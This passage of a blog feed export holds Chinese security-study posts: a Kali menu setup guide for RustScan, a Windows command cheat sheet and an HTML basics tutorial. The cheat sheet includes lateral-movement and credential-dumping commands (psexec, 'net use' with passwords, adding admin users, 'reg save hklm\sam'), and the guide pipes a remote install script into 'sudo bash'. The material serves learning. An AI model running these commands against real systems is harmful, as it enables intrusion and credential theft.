<h4 id="✅-步骤-4：修正-Categories-标签"><a href="#✅-步骤-4：修正-Categories-标签" class="headerlink" title="✅ 步骤 4：修正 Categories 标签"></a>✅ <strong>步骤 4：修正 Categories 标签</strong></h4>  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 编辑 desktop 文件</span></span><br><span class="line">vim ~/.local/share/applications/rustscan.desktop</span><br></pre></td></tr></table></figure>
<blockquote>
<p>✏️ <strong>修改内容</strong>：</p>
<pre><code class="language-ini"># 现在查看右键菜单中其他快捷方式的格式
cat /usr/share/applications/xxx.desktop
# 找到 Categories 行，替换为精准标签
Categories=kali-reconnaissance;kali-network-information;kali-network-service-discovery; 
</code></pre>
</blockquote>
<blockquote>
<p>✅ <strong>‘完整’配置示例</strong>：</p>
<pre><code class="language-ini">[Desktop Entry]
Version=1.0
Type=Application
Name=
Comment=
Exec=
Icon=system-run
Terminal=true
Type=Application
Categories=kali-reconnaissance;kali-network-information;kali-network-service-discovery; # 主要修改这里，其他在创建启动器的时候会自动填充
StartupNotify=false
</code></pre>
</blockquote>
<blockquote>
<p>✏️ <strong>保存并退出</strong>：  </p>
<ul>
<li>：wq</li>
</ul>
</blockquote>
<hr>
<h4 id="✅-步骤-5：刷新菜单缓存"><a href="#✅-步骤-5：刷新菜单缓存" class="headerlink" title="✅ 步骤 5：刷新菜单缓存"></a>✅ <strong>步骤 5：刷新菜单缓存</strong></h4>  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 删除所有缓存</span></span><br><span class="line"><span class="built_in">rm</span> -rf ~/.cache/menus ~/.cache/desktop-directories ~/.cache/desktop-files</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 重启面板（强制生效）</span></span><br><span class="line">xfce4-panel --restart</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="⚠️-常见错误解决方案"><a href="#⚠️-常见错误解决方案" class="headerlink" title="⚠️ 常见错误解决方案"></a>⚠️ <strong>常见错误解决方案</strong></h3><table>
<thead>
<tr>
<th>问题</th>
<th>原因</th>
<th>解决方案</th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>which rustscan</code> 无输出</strong></td>
<td>安装失败</td>
<td>重新执行安装脚本：<code>curl -s https://raw.githubusercontent.com/RustScan/RustScan/master/script/install.sh | sudo bash</code></td>
</tr>
<tr>
<td><strong>移动时报错 “不是目录”</strong></td>
<td><code>~/.local/share/applications</code> 是文件</td>
<td>执行 <code>rm -f ~/.local/share/applications</code> 再重建目录</td>
</tr>
<tr>
<td><strong>菜单只在”网络扫描”显示</strong></td>
<td>缺少 <code>kali-network-information</code> 标签</td>
<td>用 <code>sed</code> 修正 Categories 行：<code>sed -i &#39;s/Categories=.*/Categories=kali-reconnaissance;kali-network-information;kali-network-service-discovery;/&#39; ~/.local/share/applications/rustscan.desktop</code></td>
</tr>
<tr>
<td><strong>终端报错 <code>rustscan: command not found</code></strong></td>
<td>PATH 未包含 <code>/usr/bin/</code></td>
<td>执行 <code>echo &#39;export PATH=&quot;$PATH:/usr/bin&quot;&#39; &gt;&gt; ~/.zshrc &amp;&amp; source ~/.zshrc</code></td>
</tr>
<tr>
<td><strong>图标不显示</strong></td>
<td>未使用 <code>system-run</code></td>
<td>确保 <code>Icon=system-run</code>（不是 <code>kali-rustscan</code>）</td>
</tr>
</tbody></table>
<hr>
</blockquote>
</blockquote>
</blockquote>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>windows常用指令</title>
    <url>/2025/12/13/windows%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="网络配置与信息"><a href="#网络配置与信息" class="headerlink" title="网络配置与信息"></a>网络配置与信息</h2><h3 id="基本网络信息"><a href="#基本网络信息" class="headerlink" title="基本网络信息"></a>基本网络信息</h3><ul>
<li><code>ifconfig /all</code> - 获取域名、IP地址、DHCP服务器、网关、MAC地址、主机名</li>
<li><code>net config workstation</code> - 查看域名、机器名等</li>
<li><code>route print</code> - 显示IP路由，主要显示网络地址、子网掩码、网关地址和接口地址</li>
<li><code>arp</code> - 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址</li>
<li><code>arp -a</code> - 查看ARP缓存信息</li>
<li><code>nslookup</code> - IP地址侦测器</li>
</ul>
<h3 id="网络连接状态"><a href="#网络连接状态" class="headerlink" title="网络连接状态"></a>网络连接状态</h3><ul>
<li><code>netstat -a</code> - 查看开启了哪些端口（常用<code>netstat -an</code>）</li>
<li><code>netstat -n</code> - 查看端口的网络连接情况（常用<code>netstat -an</code>）</li>
<li><code>netstat -o</code> - 查看所有网络连接的进程ID（PID）</li>
<li><code>netstat -ano | findstr &quot;:80&quot;</code> - 查找包含”80”的连接（最常用）</li>
<li><code>netstat -v</code> - 查看正在进行的工作</li>
<li><code>netstat -p 协议名</code> - 查看某协议使用情况，如：<code>netstat -p tcp</code></li>
<li><code>netstat -s</code> - 查看所有协议使用情况</li>
</ul>
<h3 id="域网络信息"><a href="#域网络信息" class="headerlink" title="域网络信息"></a>域网络信息</h3><ul>
<li><code>net time /domain</code> - 查看域名、时间</li>
<li><code>net view /domain</code> - 查看域内所有共享</li>
<li><code>net view ip</code> - 查看对方局域网内开启了哪些共享</li>
<li><code>nbtstat -A ip</code> - 查看对方最近登录的用户名（需136-139端口开放，参数-A要大写）</li>
</ul>
<h2 id="用户与组管理"><a href="#用户与组管理" class="headerlink" title="用户与组管理"></a>用户与组管理</h2><h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><ul>
<li><code>net user 用户名 密码 /add</code> - 创建新用户</li>
<li><code>net user 用户名 /del</code> - 删除用户</li>
<li><code>net user guest /active:yes</code> - 激活guest账户</li>
<li><code>net user</code> - 查看所有账户</li>
<li><code>net user 账户名</code> - 查看指定账户信息</li>
<li><code>net user /domain</code> - 查看域内有哪些用户（Windows NT Workstation计算机上可用，可判断用户是否是域成员）</li>
<li><code>net user 用户名 /domain</code> - 查看域内指定账户信息</li>
<li><code>query user</code> - 查看当前在线的用户</li>
<li><code>whoami</code> - 查看当前用户及权限</li>
<li><code>whoami /all</code> - 查看当前用户的详细权限信息</li>
</ul>
<h3 id="组管理"><a href="#组管理" class="headerlink" title="组管理"></a>组管理</h3><ul>
<li><code>net group /domain</code> - 查看域中的组</li>
<li><code>net group &quot;domain admins&quot; /domain</code> - 查看当前域的管理员</li>
<li><code>net localgroup</code> - 查看所有本地组</li>
<li><code>net localgroup administrators</code> - 查看administrators组中的用户</li>
<li><code>net localgroup administrators 用户名 /add</code> - 将用户添加到管理员组</li>
</ul>
<h2 id="服务与进程管理"><a href="#服务与进程管理" class="headerlink" title="服务与进程管理"></a>服务与进程管理</h2><h3 id="服务管理"><a href="#服务管理" class="headerlink" title="服务管理"></a>服务管理</h3><ul>
<li><code>net start</code> - 查看已开启的服务</li>
<li><code>net start 服务名</code> - 启动指定服务</li>
<li><code>net stop 服务名</code> - 停止指定服务</li>
</ul>
<h3 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h3><ul>
<li><code>tasklist</code> - 查看当前进程</li>
<li><code>tasklist /svc</code> - 查看当前计算机进程及对应服务</li>
<li><code>taskkill /pid PID数</code> - 终止指定PID的进程</li>
<li><code>netstat -ano</code> - 查看当前计算机进程情况</li>
</ul>
<h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><ul>
<li><code>systeminfo</code> - 查看计算机信息（版本、位数、补丁情况）</li>
<li><code>ver</code> - 查看操作系统版本</li>
</ul>
<h2 id="文件共享与远程访问"><a href="#文件共享与远程访问" class="headerlink" title="文件共享与远程访问"></a>文件共享与远程访问</h2><h3 id="共享管理"><a href="#共享管理" class="headerlink" title="共享管理"></a>共享管理</h3><ul>
<li><code>net share</code> - 查看本地开启的共享</li>
<li><code>net share ipc$</code> - 开启ipc$共享</li>
<li><code>net share ipc$ /del</code> - 删除ipc$共享</li>
<li><code>net share c$ /del</code> - 删除C:共享</li>
<li><code>\\IP\c</code> - 访问默认共享c盘，如：<code>\\192.168.0.108\c</code></li>
</ul>
<h3 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h3><ul>
<li><code>net use \\目标IP\ipc$ 密码 /u:用户名</code> - 连接目标机器</li>
<li><code>at \\目标IP 21:31 c:\server.exe</code> - 在指定时间启动应用（适用于低版本Windows）</li>
<li><code>wmic /node:&quot;目标IP&quot; /password:&quot;123456&quot; /user:&quot;admin&quot;</code> - 连接目标机器</li>
<li><code>psexec.exe \\目标IP -u username -p password -s cmd</code> - 在目标机器上执行cmd</li>
<li><code>finger username @host</code> - 查看最近登录的用户</li>
</ul>
<h2 id="域控制器相关"><a href="#域控制器相关" class="headerlink" title="域控制器相关"></a>域控制器相关</h2><ul>
<li><code>dsquery server</code> - 查看所有域控制器</li>
<li><code>dsquery subnet</code> - 查看域内子网</li>
<li><code>dsquery group</code> - 查看域内工作组</li>
<li><code>dsquery site</code> - 查看域内站点</li>
</ul>
<h2 id="注册表与系统备份"><a href="#注册表与系统备份" class="headerlink" title="注册表与系统备份"></a>注册表与系统备份</h2><ul>
<li><code>reg save hklm\sam sam.hive</code> - 导出用户组信息、权限配置</li>
<li><code>reg save hklm\system system.hive</code> - 导出SYSKEY</li>
</ul>
<h2 id="其他实用命令"><a href="#其他实用命令" class="headerlink" title="其他实用命令"></a>其他实用命令</h2><ul>
<li><code>wmic product &gt; ins.txt</code> - 查看安装软件及版本路径等信息，输出到ins.txt文件（位于用户目录下）</li>
</ul>
<hr>
<p><em>注：以上命令基于Windows系统，部分命令可能需要管理员权限才能执行。</em></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB安全 HTML基础</title>
    <url>/2025/12/05/WEB%E5%AE%89%E5%85%A8HTML%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="1-简单的HTML页面架构"><a href="#1-简单的HTML页面架构" class="headerlink" title="1. 简单的HTML页面架构"></a>1. 简单的HTML页面架构</h2><p>HTML5标准文档结构是网页的基础框架，包含文档类型声明、根元素、头部和主体部分。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>WEB安全学习平台<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 页面内容将放置在这里 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>关键点解析：</strong></p>
<ul>
<li><code>&lt;!DOCTYPE html&gt;</code>：声明文档类型为HTML5，确保浏览器以标准模式渲染页面</li>
<li><code>&lt;html lang=&quot;zh-CN&quot;&gt;</code>：根元素，<code>lang</code>属性指定页面语言为中文</li>
<li><code>&lt;meta charset=&quot;UTF-8&quot;&gt;</code>：设置字符编码为UTF-8，确保中文等特殊字符正常显示</li>
<li><code>&lt;title&gt;</code>：定义浏览器标签页显示的标题</li>
<li><code>&lt;body&gt;</code>：包含所有页面可见内容的容器</li>
</ul>
<p><strong>安全提示</strong>：UTF-8编码是安全首选，避免使用GBK等编码，防止编码转换导致的XSS漏洞。</p>
<h2 id="2-HTML常见标签详解"><a href="#2-HTML常见标签详解" class="headerlink" title="2. HTML常见标签详解"></a>2. HTML常见标签详解</h2><h3 id="2-1-meta标签"><a href="#2-1-meta标签" class="headerlink" title="2.1 meta标签"></a>2.1 meta标签</h3><p><code>&lt;meta&gt;</code> 元素用于提供关于HTML文档的元数据，对SEO和安全配置至关重要。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 字符编码 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 页面描述（SEO优化） --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;WEB安全HTML基础教程 - 安全渗透必备技能&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 关键词（现代搜索引擎已不依赖，但部分场景仍有用） --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;keywords&quot;</span> <span class="attr">content</span>=<span class="string">&quot;网络安全, WEB渗透, 数据安全, 渗透测试, 安全培训&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 作者信息 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;author&quot;</span> <span class="attr">content</span>=<span class="string">&quot;moonsec&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 移动设备适配 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 内容安全策略（CSP）- 重要安全配置 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> </span></span><br><span class="line"><span class="tag">          <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27; https://trusted.cdn.com; style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- X-Frame-Options - 防止点击劫持 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-Frame-Options&quot;</span> <span class="attr">content</span>=<span class="string">&quot;DENY&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 刷新页面（5秒后跳转） --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;5;url=https://www.example.com&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>安全说明：</strong></p>
<ul>
<li><code>Content-Security-Policy</code> 是防御XSS攻击的重要手段，限制可执行的脚本来源</li>
<li><code>X-Frame-Options: DENY</code> 防止页面被嵌入到iframe中，避免点击劫持攻击</li>
<li><code>charset=UTF-8</code> 是安全基础，避免编码转换漏洞</li>
</ul>
<h3 id="2-2-标题标签"><a href="#2-2-标题标签" class="headerlink" title="2.2 标题标签"></a>2.2 标题标签</h3><p>HTML提供6级标题标签，从<code>&lt;h1&gt;</code>到<code>&lt;h6&gt;</code>，其中<code>&lt;h1&gt;</code>级别最高，<code>&lt;h6&gt;</code>最低。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>WEB安全核心知识<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>HTML基础<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>表单安全<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>常见漏洞类型<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span>&gt;</span>XSS攻击原理<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span>防御措施<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 换行标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是第一段内容<span class="tag">&lt;<span class="name">br</span>&gt;</span>换行后的内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 水平线标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>水平线分割内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>最佳实践：</strong></p>
<ul>
<li>一个页面通常只有一个<code>&lt;h1&gt;</code>，用于主标题</li>
<li>标题层级应逐级下降，不要跳级使用（如不要从<code>&lt;h1&gt;</code>直接到<code>&lt;h4&gt;</code>）</li>
<li>合理的标题结构有助于屏幕阅读器理解页面结构，提升可访问性</li>
<li>换行标签<code>&lt;br&gt;</code>应避免过度使用，优先使用CSS控制布局</li>
</ul>
<h3 id="2-3-文本属性"><a href="#2-3-文本属性" class="headerlink" title="2.3 文本属性"></a>2.3 文本属性</h3><p>常用文本格式化标签，注意HTML5中已废弃某些标签，应使用CSS替代。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>加粗文本（语义重要）<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> 或 <span class="tag">&lt;<span class="name">b</span>&gt;</span>加粗文本（仅视觉）<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">em</span>&gt;</span>斜体文本（语义强调）<span class="tag">&lt;/<span class="name">em</span>&gt;</span> 或 <span class="tag">&lt;<span class="name">i</span>&gt;</span>斜体文本（仅视觉）<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">u</span>&gt;</span>下划线文本（谨慎使用，通常用于链接）<span class="tag">&lt;/<span class="name">u</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>数学公式: X<span class="tag">&lt;<span class="name">sup</span>&gt;</span>2<span class="tag">&lt;/<span class="name">sup</span>&gt;</span> + H<span class="tag">&lt;<span class="name">sub</span>&gt;</span>2<span class="tag">&lt;/<span class="name">sub</span>&gt;</span>O<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">del</span>&gt;</span>已删除的内容<span class="tag">&lt;/<span class="name">del</span>&gt;</span> <span class="tag">&lt;<span class="name">ins</span>&gt;</span>已添加的内容<span class="tag">&lt;/<span class="name">ins</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">    预格式化文本示例：</span><br><span class="line">      保留空格和换行</span><br><span class="line">      function example() &#123;</span><br><span class="line">          console.log(&quot;Hello World&quot;);</span><br><span class="line">      &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>安全注意事项：</strong></p>
<ul>
<li><code>&lt;font&gt;</code> 标签在HTML5中已被废弃，应使用CSS控制字体样式</li>
<li><code>&lt;strong&gt;</code> 和 <code>&lt;em&gt;</code> 具有语义含义，表示内容的重要性或强调，对SEO和可访问性有帮助</li>
<li><code>&lt;del&gt;</code> 和 <code>&lt;ins&gt;</code> 用于表示内容的删除和添加，常用于修订文档</li>
<li><code>&lt;pre&gt;</code> 保留所有空格和换行，适合展示代码、ASCII艺术等</li>
</ul>
<h3 id="2-4-form表单"><a href="#2-4-form表单" class="headerlink" title="2.4 form表单"></a>2.4 form表单</h3><p><code>&lt;form&gt;</code> 用于创建用户可提交数据的表单，是Web交互的核心组件，也是安全漏洞高发区。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/submit&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>用户名:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入用户名&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>密码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">minlength</span>=<span class="string">&quot;8&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>上传头像:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;avatar&quot;</span> <span class="attr">accept</span>=<span class="string">&quot;image/*&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;email&quot;</span>&gt;</span>邮箱:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;color&quot;</span>&gt;</span>选择颜色:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;color&quot;</span> <span class="attr">id</span>=<span class="string">&quot;color&quot;</span> <span class="attr">name</span>=<span class="string">&quot;color&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#ff0000&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;checkbox1&quot;</span>&gt;</span>选项1<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">id</span>=<span class="string">&quot;checkbox1&quot;</span> <span class="attr">name</span>=<span class="string">&quot;option&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;checkbox2&quot;</span>&gt;</span>选项2<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">id</span>=<span class="string">&quot;checkbox2&quot;</span> <span class="attr">name</span>=<span class="string">&quot;option&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;radio1&quot;</span>&gt;</span>选项A<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;radio1&quot;</span> <span class="attr">name</span>=<span class="string">&quot;group&quot;</span> <span class="attr">value</span>=<span class="string">&quot;A&quot;</span> <span class="attr">checked</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;radio2&quot;</span>&gt;</span>选项B<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;radio2&quot;</span> <span class="attr">name</span>=<span class="string">&quot;group&quot;</span> <span class="attr">value</span>=<span class="string">&quot;B&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;重置&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;abc123&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>安全关键点：</strong></p>
<ul>
<li><code>method=&quot;post&quot;</code>：数据通过HTTP请求体发送，适合敏感数据（如登录），GET方法会将数据暴露在URL中</li>
<li><code>enctype=&quot;multipart/form-data&quot;</code>：文件上传时必须使用此编码类型</li>
<li><code>required</code>：必填字段，提交时会自动验证</li>
<li><code>placeholder</code>：输入框提示文本</li>
<li><code>accept=&quot;image/*&quot;</code>：限制文件类型为图片</li>
<li><code>minlength</code>：设置密码最小长度</li>
<li><code>hidden</code>：隐藏域，用于传递不可见数据（如CSRF令牌）</li>
<li><strong>安全提示</strong>：表单应使用HTTPS传输，对用户输入进行严格验证，防止XSS和SQL注入攻击</li>
</ul>
